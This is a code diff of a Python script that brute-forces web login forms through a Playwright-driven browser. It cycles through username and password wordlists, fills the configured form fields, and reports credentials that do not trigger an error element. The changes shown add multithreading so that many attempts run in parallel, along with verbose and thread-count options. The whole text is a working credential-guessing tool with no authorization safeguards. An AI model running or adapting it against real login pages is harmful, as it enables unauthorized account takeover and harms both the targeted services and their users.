@@ -1,36 +1,32 @@
 import argparse
 from dataclasses import dataclass
+from concurrent.futures import ThreadPoolExecutor
 from playwright.sync_api import sync_playwright
 
 
-@dataclass
-class Arguments:
-    login_form_url: str
-    user_list: str
-    password_list: str
-    user_selector: str
-    password_selector: str
-    btn_selector: str
-    incorrect_selector: str
-    headless: bool = False
+def debug(msg, args):
+    if args.verbose:
+        print(msg)
 
 
-def login_attempt(user: str, password: str, args: Arguments):
-    print(f"logging attempt with {user} and {password}")
+def login_attempt(executor_args):
+    user, password, args = executor_args
+    debug(f"logging attempt with {user} and {password}", args)
     with sync_playwright() as p:
-        browser = p.chromium.launch(headless=args.headless)
+        browser = p.chromium.launch(headless=not args.show_browser)
         page = browser.new_page()
         page.goto(args.login_form_url)
         page.wait_for_url(args.login_form_url)
         page.wait_for_selector(args.user_selector)
-        page.wait_for_selector(args.password_selector)
+        page.wait_for_selector(args.passwd_selector)
         page.locator(args.user_selector).fill(user)
-        page.locator(args.password_selector).fill(password)
-        page.locator(args.btn_selector).click()
+        page.locator(args.passwd_selector).fill(password)
+        page.locator(args.button_selector).click()
         try:
             page.wait_for_selector(args.incorrect_selector, timeout=1000)
             return False
         except Exception:
+            print(f"Login successful with {user} and {password}")
             return True
         finally:
             browser.close()
@@ -50,12 +46,10 @@ def get_args():
     parser.add_argument('--button-selector', required=True)
     parser.add_argument('--incorrect-selector', required=True)
     parser.add_argument('--show-browser', action="store_true")
+    parser.add_argument('--verbose', action="store_true")
+    parser.add_argument('--threads', type=int, default=4)
 
-    args = parser.parse_args()
-
-    return Arguments(args.login_form_url, args.user_list, args.passwd_list, args.user_selector,
-                     args.passwd_selector, args.button_selector, args.incorrect_selector, not args.show_browser)
-
+    return parser.parse_args()
 
 def load_word_list(word_list_file):
     with open(word_list_file, 'r') as wlf:
@@ -63,14 +57,22 @@ def load_word_list(word_list_file):
         return [line.rstrip() for line in lines]
 
 
-if __name__ == '__main__':
+def brute_force():
     args = get_args()
     users = load_word_list(args.user_list)
-    passwords = load_word_list(args.password_list)
+    passwords = load_word_list(args.passwd_list)
+    executor = ThreadPoolExecutor(max_workers=args.threads)
+    attemps = []
     for user in users:
         for password in passwords:
-            success = login_attempt(user, password, args)
-            if success:
-                print(
-                    f"Login successful with user={user} and password={password}")
-                exit(0)
+            attemps.append([user, password, args])
+    results = executor.map(login_attempt, attemps)
+    for found in results:
+        if found:
+            debug("Shutting down ...", args)
+            executor.shutdown(cancel_futures=True)
+            break
+
+
+if __name__ == '__main__':
+    brute_force()
